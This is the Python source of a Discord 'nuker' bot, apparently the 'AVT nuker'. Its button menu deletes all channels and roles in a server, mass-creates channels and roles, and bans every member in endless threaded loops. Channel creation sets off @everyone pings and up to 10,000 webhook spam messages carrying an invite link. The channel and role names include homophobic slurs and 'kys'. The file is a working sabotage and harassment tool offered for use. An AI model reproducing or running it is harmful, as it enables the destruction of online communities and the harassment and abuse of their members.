import discord
from discord.ext import commands
import requests
import threading 
import time
import os
import random
from pystyle import Colors, Colorate, Box
import time
import asyncio

token = input("Bot token?: ")
prefix = input("Prefix?: ")

channel_names = ["nuked", "nuked by AVT", "ez nuke", "faggots destroyed by AVT"]
role_names = ["avt destroyed", "kys faggots"]
spam_message = "@everyone https://discord.gg/JaDteJVQ4N"
webhookname = "ATV ON TOP"


bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)


headers = {
    "Authorization": f"Bot {token}"
}

@bot.event
async def on_ready():
    print(Box.Lines(f"\nWelcome To AVT nuker type: {prefix}help in chat"))
    print(Colorate.Horizontal(Colors.black_to_white, f"""
    
                    made by: shreknatio, leviathan, doom
                   client: {bot.user}
 
    """))
    
    

class Menu(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.value = None
    @discord.ui.button(label="Nuke Server", style=discord.ButtonStyle.red)
    async def menu1(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        def del_chan(i):
            session = requests.Session()
            session.delete(f"https://discord.com/api/v9/channels/{i}", headers=headers)
        
        async def delete_chan():
            for i in range(2):
                for channel in interaction.guild.channels:
                    threading.Thread(target=del_chan, args=(channel.id,)).start()
        await delete_chan()
        
        def create_chan():
            json = {
                "name": random.choice(channel_names)
            }
            session = requests.Session()
            session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=json)
        
        async def car_chan():
            for i in range(200):
                threading.Thread(target=create_chan).start()
        await car_chan()
        def ban_mem(i):
            session = requests.Session()
            while True:
                session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{i}", headers=headers)
        
        async def banAll():
            for member in interaction.guild.members:
                threading.Thread(target=ban_mem, args=(member.id,)).start()
        await banAll()
        def del_role(i):
            session = requests.Session()
            session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{i}", headers=headers)
        
        async def delete_roles():
            for i in range(2):
                for role in interaction.guild.roles:
                    threading.Thread(target=del_role, args=(role.id,)).start()
        await delete_roles()
        def create_rol():
            json = {
                "name": random.choice(role_names)
            }
            session = requests.Session()
            session.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=json)
        
        async def create_roles():
            for i in range(120):
                threading.Thread(target=create_rol).start()
        await create_roles()
    
    @discord.ui.button(label="Delete Channels", style=discord.ButtonStyle.green)
    async def menu2(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        def del_chan(i):
            session = requests.Session()
            session.delete(f"https://discord.com/api/v9/channels/{i}", headers=headers)
        
        async def delete_chan():
            for i in range(3):
                for channel in interaction.guild.channels:
                    threading.Thread(target=del_chan, args=(channel.id,)).start()
        await delete_chan()
    
    @discord.ui.button(label="Mass Ban", style=discord.ButtonStyle.blurple)
    async def menu3(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        def ban_mem(i):
            session = requests.Session()
            while True:
                session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{i}", headers=headers)
        
        async def banAll():
            for member in interaction.guild.members:
                threading.Thread(target=ban_mem, args=(member.id,)).start()
        await banAll()
        
    @discord.ui.button(label="Delete Roles", style=discord.ButtonStyle.grey)
    async def menu4(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        def del_role(i):
            session = requests.Session()
            session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{i}", headers=headers)
        
        async def delete_roles():
            for i in range(3):
                for role in interaction.guild.roles:
                    threading.Thread(target=del_role, args=(role.id,)).start()
        await delete_roles()
    
    @discord.ui.button(label="Create Roles", style=discord.ButtonStyle.green)
    async def menu5(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        def create_rol():
            json = {
                "name": random.choice(role_names)
            }
            session = requests.Session()
            session.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=json)
        
        async def create_roles():
            for i in range(120):
                threading.Thread(target=create_rol).start()
        await create_roles()
@bot.command()
async def help(ctx):
    view = Menu()
    view.add_item(discord.ui.Button(label="Invite", style=discord.ButtonStyle.link, url=f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"))
    embed = discord.Embed(title="**Nuke Server**", description="Pls Choose One of the Options Below")
    await ctx.reply(embed=embed, view = view)
    
@bot.event
async def on_guild_channel_create(channel):
    ctxguild = channel.guild
    if channel.name in channel_names:
        while True:
            def mass_ping(i):
                session = requests.Session()
                json = {
                    "content": spam_message
                }
                r = session.post(f"https://discord.com/api/v9/channels/{i}/messages", headers=headers, json=json)
                
            
            async def massPing():
                for channelr in ctxguild.channels:
                    threading.Thread(target=mass_ping, args=(channelr.id,)).start()
                    
            await massPing()

@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webhookname)
            for i in range(10000):   
                 await webhook.send(spam_message)
        except:
            return
  
try:
  bot.run(token)
except:
  print("False token or Rate limited")
